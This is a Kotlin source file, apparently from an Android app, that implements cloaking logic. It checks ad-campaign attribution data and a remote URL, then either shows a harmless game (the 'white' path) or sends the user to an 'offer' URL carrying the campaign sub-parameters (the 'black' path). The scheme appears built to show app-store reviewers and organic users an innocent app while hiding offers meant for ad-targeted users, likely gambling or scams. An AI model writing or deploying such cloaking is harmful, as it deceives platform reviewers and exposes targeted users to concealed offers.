package com.presidentserviceconsult.dimaz.black.cloaca.logic_cloaca

import com.presidentserviceconsult.dimaz.black.cloaca.init_sdk.ForTest
import com.presidentserviceconsult.dimaz.black.cloaca.init_sdk.STATUS

object LogicCloaca {
    fun logic(
        base_url: String,
        state: Boolean,
        dataAttributionMap: Map<String, String>,
        goToWhite: () -> Unit,
        goToBlack: (String) -> Unit
    ): ForTest {

        if (base_url.isBlank()) {
            goToWhite()
            return ForTest(STATUS.ToGame)
        }


        var parseCompaign = parseSubs(
            dataAttributionMap.get("campaign")?:""
        ) ?: mapOf()

        if (!state && parseCompaign.size == 1) {
            goToWhite()

            return ForTest(STATUS.ToGame)

        }

        val base_url = removeQueryString(base_url)

        var parseStrCompaign = "?"
        var isFirstSub = true
        if(parseCompaign.size != 1) {
            for (i in parseCompaign) {
                if (isFirstSub) {
                    parseStrCompaign += "${i.key}=${i.value}"
                    isFirstSub = false
                } else {
                    parseStrCompaign += "&${i.key}=${i.value}"
                }
            }
        }
         var finalUrl = "$base_url" + if(parseStrCompaign == "?") "" else parseStrCompaign

        goToBlack(finalUrl)
        return ForTest(STATUS.ToOffer,finalUrl )

    }


   private fun parseSubs(
        campaignName: String
    ): Map<String, String>? {
        return if(campaignName.split("_").size!=1){
            campaignName
                .split("_")
                .mapIndexed { index, s ->

                    "sub${index + 1}" to s

                }.associate { it }
        }else{
            mapOf("" to "")
        }
    }


   private fun removeQueryString(input: String): String {
        val indexOfQuestionMark = input.indexOf('?')

        return if (indexOfQuestionMark != -1) {
            input.substring(0, indexOfQuestionMark)
        } else {
            input
        }
    }
}
